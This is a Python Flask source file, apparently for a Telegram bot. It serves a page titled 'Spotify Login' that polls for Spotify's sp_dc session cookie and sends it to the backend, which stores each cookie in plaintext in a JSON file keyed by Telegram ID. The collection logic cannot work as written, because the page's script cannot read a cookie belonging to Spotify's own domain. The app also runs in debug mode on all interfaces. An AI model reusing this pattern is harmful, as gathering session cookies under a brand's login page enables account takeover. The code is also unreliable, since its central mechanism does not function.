from flask import Flask, request, redirect, url_for, render_template_string
import requests
import os

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = os.getenv("BOT_TOKEN")
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

# Replace with your domain or localhost + port
BASE_URL = os.getenv("BASE_URL", "http://localhost:5000")

LOGIN_PAGE_HTML = """
<!DOCTYPE html>
<html>
<head>
  <title>Spotify Login</title>
</head>
<body>
  <h2>Login to Spotify</h2>
  <p>Please login in the popup and then allow this page to access your Spotify cookie.</p>

  <button onclick="openSpotify()">Open Spotify Login</button>

<script>
function openSpotify() {
  window.open("https://accounts.spotify.com/en/login", "_blank", "width=500,height=700");
}

// Poll for sp_dc cookie after popup login
function getCookie(name) {
  let value = "; " + document.cookie;
  let parts = value.split("; " + name + "=");
  if (parts.length === 2) return parts.pop().split(";").shift();
}

function checkCookie() {
  const sp_dc = getCookie('sp_dc');
  if(sp_dc) {
    // Send cookie to backend
    fetch("/save_cookie", {
      method: "POST",
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({sp_dc: sp_dc, telegram_id: "{{ telegram_id }}"})
    }).then(res => res.text()).then(data => {
      document.body.innerHTML = "<h3>Cookie saved successfully! You can close this page now.</h3>";
    }).catch(e => {
      document.body.innerHTML = "<h3>Error saving cookie.</h3>";
    });
  } else {
    setTimeout(checkCookie, 1500);
  }
}

// Start polling after user clicks login
document.querySelector("button").addEventListener("click", () => {
  setTimeout(checkCookie, 3000);
});
</script>
</body>
</html>
"""

@app.route("/login")
def login():
    telegram_id = request.args.get("telegram_id")
    if not telegram_id:
        return "Missing telegram_id param", 400

    return render_template_string(LOGIN_PAGE_HTML, telegram_id=telegram_id)

@app.route("/save_cookie", methods=["POST"])
def save_cookie():
    data = request.get_json()
    sp_dc = data.get("sp_dc")
    telegram_id = data.get("telegram_id")

    if not sp_dc or not telegram_id:
        return "Missing sp_dc or telegram_id", 400

    # Send sp_dc to telegram bot
    text = f"✅ Login successful! Your sp_dc cookie has been saved."
    send_telegram_message(telegram_id, text)

    # Save cookie in file (tokens.json) - append or update
    import json
    tokens_file = "sp_dc_tokens.json"
    try:
        with open(tokens_file, "r") as f:
            tokens = json.load(f)
    except:
        tokens = {}

    tokens[telegram_id] = sp_dc
    with open(tokens_file, "w") as f:
        json.dump(tokens, f, indent=2)

    return "OK"

def send_telegram_message(chat_id, text):
    data = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(TELEGRAM_API_URL, data=data)
    except Exception as e:
        print("Telegram send message error:", e)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
